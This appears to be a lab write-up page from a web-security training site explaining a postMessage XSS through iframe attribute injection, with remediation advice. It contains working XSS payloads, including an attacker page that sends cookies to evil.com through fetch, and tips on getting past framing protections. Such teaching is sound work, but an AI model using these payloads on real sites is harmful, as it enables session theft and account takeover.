@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PostMessage XSS via Iframe Attribute Injection - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/labs/realworld/postmessage-iframe-xss.html" class="try-lab">Try the Lab &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev high">High</span>
+      <span class="writeup-category">PostMessage &middot; XSS &middot; Iframe Injection &middot; Attribute Breakout</span>
+    </div>
+
+    <h1>PostMessage XSS: Breaking Out of Iframe Attributes via Unsanitized Message Data</h1>
+    <div class="writeup-author">Based on <strong>Youghourta Ghannei</strong>'s private program writeup &middot; postMessage to DOM injection</div>
+
+    <div class="callout callout-vuln">
+      <h4>Vulnerability</h4>
+      <p>A web application creates floating page panels (help center, chat, feedback) by dynamically building iframe elements from <code>postMessage</code> data. The message handler has <strong>no origin check</strong> and the <code>url</code>, <code>name</code>, and <code>id</code> fields from the message are inserted directly into an HTML string via concatenation. An attacker breaks out of the iframe <code>src</code> attribute to inject arbitrary event handlers, achieving XSS.</p>
+    </div>
+
+    <h2>The Vulnerable Code</h2>
+    <p>The researcher discovered a <code>postMessage</code> listener that creates floating page elements. The handler builds an iframe using string concatenation with unsanitized message data:</p>
+
+    <pre><code>window.addEventListener('message', function(event) {
+  // NO ORIGIN CHECK - accepts messages from any source
+
+  if (event.data && event.data.message === 'e:openFloatingPage') {
+    var d = event.data.data;
+    if (d && d.url && d.name && d.id) {
+      // VULNERABLE: No sanitization on url, name, id
+      // Values concatenated directly into HTML string
+      var html = '&lt;iframe src="' + d.url + '"' +
+                 ' name="' + d.name + '"' +
+                 ' id="' + d.id + '"' +
+                 ' style="width:100%;height:300px;border:none"&gt;' +
+                 '&lt;/iframe&gt;';
+
+      container.insertAdjacentHTML('beforeend', html);
+    }
+  }
+});</code></pre>
+
+    <p>Three injection points exist: <code>d.url</code>, <code>d.name</code>, and <code>d.id</code>. Each is placed inside an HTML attribute without sanitization.</p>
+
+    <h2>The Exploitation Process</h2>
+
+    <h3>Step 1: Identify the Sink</h3>
+    <p>The researcher searched the application's JavaScript for postMessage listeners and found the <code>createFloatingPageElement</code> pattern. The key insight: the values flow from <code>event.data</code> directly into an HTML string that's inserted via <code>insertAdjacentHTML</code>.</p>
+
+    <h3>Step 2: Craft the Attribute Breakout</h3>
+    <p>To break out of the <code>src="..."</code> attribute, inject a double quote followed by an event handler:</p>
+
+    <pre><code>// The payload breaks out of the src attribute
+// and injects an onload event handler
+
+var message = {
+  "message": "e:openFloatingPage",
+  "data": {
+    "id": "xss1",
+    "name": "test",
+    "url": 'https://example.com" onload="alert(document.cookie)'
+  }
+};
+
+// This produces:
+// &lt;iframe src="https://example.com" onload="alert(document.cookie)"
+//   name="test" id="xss1" ...&gt;&lt;/iframe&gt;
+//
+// The onload fires when the iframe loads → XSS!</code></pre>
+
+    <h3>Step 3: Overcome X-Frame-Options</h3>
+    <p>The initial payload failed because the target URL set <code>X-Frame-Options: SAMEORIGIN</code>, preventing it from loading in the iframe &mdash; which means <code>onload</code> still fires but the iframe shows an error.</p>
+
+    <p>The researcher found an alternate endpoint without framing protection:</p>
+
+    <pre><code>// download.php didn't have X-Frame-Options!
+// Found via directory enumeration with ffuf/dirsearch
+
+// Refined payload using the frameable endpoint:
+var message = {
+  "message": "e:openFloatingPage",
+  "data": {
+    "id": "xss1",
+    "name": "test",
+    "url": '/download?p=test" onload="alert(document.cookie)'
+  }
+};
+
+// The iframe loads /download?p=test successfully (no XFO)
+// onload fires → JavaScript executes in parent context</code></pre>
+
+    <h3>Step 4: Send the Message</h3>
+    <pre><code>&lt;!-- Attacker's page --&gt;
+
+&lt;!-- Iframe the vulnerable page (if frameable) --&gt;
+&lt;iframe id="target" src="https://target.com/app"&gt;&lt;/iframe&gt;
+
+&lt;script&gt;
+document.getElementById('target').onload = function() {
+  // Send the malicious postMessage
+  this.contentWindow.postMessage({
+    "message": "e:openFloatingPage",
+    "data": {
+      "id": "pwned",
+      "name": "test",
+      "url": '/download?p=x" onload="fetch(\'https://evil.com/steal?c=\'+document.cookie)'
+    }
+  }, '*');
+};
+&lt;/script&gt;
+
+&lt;!-- Alternative: if target page has window.opener --&gt;
+&lt;script&gt;
+var w = window.open('https://target.com/app');
+setTimeout(function() {
+  w.postMessage({
+    "message": "e:openFloatingPage",
+    "data": {
+      "id": "pwned",
+      "name": "test",
+      "url": '/download?p=x" onload="alert(document.domain)'
+    }
+  }, '*');
+}, 2000);
+&lt;/script&gt;</code></pre>
+
+    <div class="callout callout-chain">
+      <h4>The Chain</h4>
+      <p><strong>Bug 1:</strong> postMessage listener with no origin validation</p>
+      <p><strong>Bug 2:</strong> Message data inserted into HTML string without sanitization (attribute injection)</p>
+      <p><strong>Bug 3:</strong> Frameable endpoint without X-Frame-Options (enables the iframe to actually load)</p>
+      <p><strong>Result:</strong> XSS execution in the context of the target application &mdash; cookie theft, session hijacking, account takeover</p>
+    </div>
+
+    <h2>Alternative Injection Points</h2>
+    <p>The <code>name</code> and <code>id</code> fields are also injectable. Each provides a different breakout:</p>
+
+    <pre><code>// Inject via name attribute:
+{
+  "id": "safe",
+  "name": 'safe" onmouseover="alert(1)" x="',
+  "url": "https://example.com"
+}
+// &lt;iframe src="https://example.com"
+//   name="safe" onmouseover="alert(1)" x=""
+//   id="safe" ...&gt;
+
+// Inject via id to break out entirely:
+{
+  "id": 'x">&lt;img src=x onerror=alert(1)>&lt;iframe x="',
+  "name": "safe",
+  "url": "https://example.com"
+}
+// Closes the iframe tag and injects a new img element</code></pre>
+
+    <div class="callout callout-impact">
+      <h4>Why It Matters</h4>
+      <p>This pattern is extremely common in modern web apps. Floating widgets (help, chat, feedback, notifications) often use postMessage to communicate between the parent page and embedded iframes. If the handler builds DOM elements from message data using string concatenation, every field is a potential XSS vector. The no-origin-check + string-concat-to-DOM combination is one of the most reliable postMessage XSS patterns.</p>
+    </div>
+
+    <div class="callout callout-tip">
+      <h4>Bug Bounty Tip</h4>
+      <p>When you find a postMessage handler that creates DOM elements: (1) Check if any message field ends up in an HTML string (not just innerHTML &mdash; also <code>insertAdjacentHTML</code>, <code>document.write</code>, jQuery <code>.html()</code>). (2) Try breaking out of the attribute context with <code>"</code> followed by an event handler. (3) If the iframe <code>onload</code> doesn't fire because of X-Frame-Options, find a frameable endpoint on the same origin &mdash; static files, download pages, and API endpoints often lack framing headers. (4) You can also try <code>srcdoc</code> or <code>javascript:</code> as the URL to bypass framing entirely.</p>
+    </div>
+
+    <h2>Remediation</h2>
+    <ul>
+      <li><strong>Always validate <code>event.origin</code></strong> against a strict allowlist before processing any postMessage</li>
+      <li><strong>Never build HTML strings from message data.</strong> Use DOM APIs: <code>iframe.setAttribute('src', url)</code> safely sets the attribute without injection</li>
+      <li><strong>Sanitize all values</strong> that will be used in HTML contexts &mdash; escape <code>"</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code></li>
+      <li><strong>Add X-Frame-Options or CSP frame-ancestors</strong> to all pages, including static assets and download endpoints</li>
+      <li>Use a Content Security Policy with strict <code>script-src</code> to mitigate successful injection</li>
+    </ul>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice This Vulnerability</h4>
+        <p>Lab: CloudDocs &mdash; a realistic document management app with a floating widget system. Find the postMessage listener, craft the attribute breakout, achieve XSS.</p>
+      </div>
+      <a href="/labs/realworld/postmessage-iframe-xss.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/cspt-delete-requests">&larr; CSPT in DELETE Requests</a>
+      <a href="/writeups/dom-xss-createcontextualfragment">DOM XSS createContextualFragment &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
